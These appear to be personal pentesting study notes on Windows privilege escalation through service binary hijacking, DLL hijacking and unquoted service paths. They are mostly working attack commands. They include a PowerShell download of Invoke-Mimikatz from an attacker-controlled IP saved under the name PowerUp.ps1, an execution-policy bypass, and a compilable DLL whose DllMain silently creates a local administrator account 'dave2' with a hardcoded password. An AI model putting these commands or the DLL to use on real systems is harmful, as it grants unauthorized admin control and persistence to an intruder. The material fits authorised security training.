### Service Binary Hijacking
Get-Service
Get-CimInstance

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls
Get-ACL
icacls "C:\xampp\apache\bin\httpd.exe"



replace the binary with desired exe
restart service if rights
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'BackupMonitor'}
shutdown /r /t 0

powerup,ps1

iwr -uri http://192.168.45.186:8000/Invoke-Mimikatz.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile

### service DLL hijacking

search order for dll
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```
Get-Process chrome | select -ExpandProperty modules | group -Property FileName | select name

Dllmain four cases

DLL_PROCESS_ATTACH
DLL_THREAD_ATTACH
DLL_THREAD_DETACH
DLL_PROCESS-DETACH

DLL code
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

### Unquoted Service Paths

Get-CimInstance -ClassName win32_service | Select Name,State,PathName

cmd - wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
check for rights at all path using icacls
copy the exe at path that is writeable
restart service

powerup

Get-UnquotedService